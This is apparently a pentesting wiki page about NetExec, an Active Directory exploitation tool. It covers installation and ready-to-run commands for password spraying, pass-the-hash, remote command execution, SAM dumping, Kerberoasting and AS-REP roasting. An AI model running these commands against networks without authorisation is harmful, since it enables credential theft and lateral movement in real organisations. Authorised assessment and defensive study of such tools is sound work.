---
title: "NetExec"
category: "tool"
subcategory: "active-directory"
tags: ["network-exploitation", "smb", "ldap", "winrm", "credential-spraying", "lateral-movement"]
last_updated: "2025-12-27"
---

# NetExec

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Protocol Modules](#protocol-modules)
- [Documentation Files](#documentation-files)
- [Resources](#resources)

## Overview

NetExec (nxc) is the successor to CrackMapExec, a network service exploitation tool for automating security assessments of large networks. Originally created by @byt3bl33d3r in 2015 as CrackMapExec, the project was renamed to NetExec in 2023 and is now maintained by the community.

Key capabilities:
- Multi-protocol support (SMB, LDAP, WinRM, MSSQL, SSH, RDP, WMI, FTP, NFS)
- Password spraying and credential validation
- Command execution across multiple hosts
- Active Directory enumeration and exploitation
- BloodHound integration for attack path mapping

## Installation

### Linux (pipx - Recommended)

```bash
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Kali Linux

```bash
sudo apt install netexec
```

## Quick Start

### SMB - Check Credentials

```bash
# Password authentication
nxc smb 192.168.1.0/24 -u admin -p 'Password123'

# Hash authentication (pass-the-hash)
nxc smb 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76

# Execute commands
nxc smb 192.168.1.100 -u admin -p 'Password123' -x 'whoami'
```

### WinRM - Remote Command Execution

```bash
# Check WinRM access
nxc winrm 192.168.1.100 -u admin -p 'Password123'

# Execute PowerShell commands
nxc winrm 192.168.1.100 -u admin -p 'Password123' -x 'Get-Process'

# Dump SAM database
nxc winrm 192.168.1.100 -u admin -p 'Password123' --sam
```

### LDAP - Active Directory Enumeration

```bash
# Enumerate domain users
nxc ldap dc01.domain.local -u user -p 'Password123' --users

# Kerberoasting
nxc ldap dc01.domain.local -u user -p 'Password123' --kerberoasting output.txt

# ASREPRoasting
nxc ldap dc01.domain.local -u user -p 'Password123' --asreproast output.txt

# BloodHound collection
nxc ldap dc01.domain.local -u user -p 'Password123' --bloodhound -c All
```

## Protocol Modules

| Protocol | Port | Key Features |
|----------|------|--------------|
| SMB | 445 | Auth, exec, shares, credential dumping, LAPS |
| LDAP | 389/636 | User enum, Kerberoasting, ASREPRoast, BloodHound |
| WinRM | 5985/5986 | Remote PowerShell, credential dumping |
| MSSQL | 1433 | SQL auth, xp_cmdshell, privilege escalation |
| SSH | 22 | Auth, command execution, file transfer |
| RDP | 3389 | Auth check, screenshots |
| WMI | 135 | Remote execution via WMI |
| FTP | 21 | Auth, file operations |
| NFS | 2049 | Share enumeration, file access |

## Documentation Files

| File | Description |
|------|-------------|
| [protocols.md](protocols.md) | Complete protocol reference (SMB, LDAP, WinRM, MSSQL, SSH, RDP, WMI) |
| [official_docs.md](official_docs.md) | Wiki navigation and protocol documentation links |

## Resources

- **Wiki**: https://netexec.wiki/
- **GitHub**: https://github.com/Pennyw0rth/NetExec
- **Discord**: https://discord.gg/pjwUTQzg8R
